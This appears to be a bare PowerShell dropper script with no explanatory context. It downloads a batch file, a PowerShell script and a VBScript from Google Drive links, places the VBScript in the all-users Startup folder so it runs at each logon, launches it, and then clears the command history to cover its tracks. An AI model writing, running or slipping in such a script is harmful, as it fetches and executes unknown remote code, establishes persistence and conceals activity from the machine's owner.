cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ReV3ChWkcFP1_FTecTOsJIALG66dlDZC" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1sdKjcgnSEWCaxD4Sz4hV1yIZU0bd7FSI" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1hLf6RPAhr2LF8kdg8tOlwIuhrgfzoyCL" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit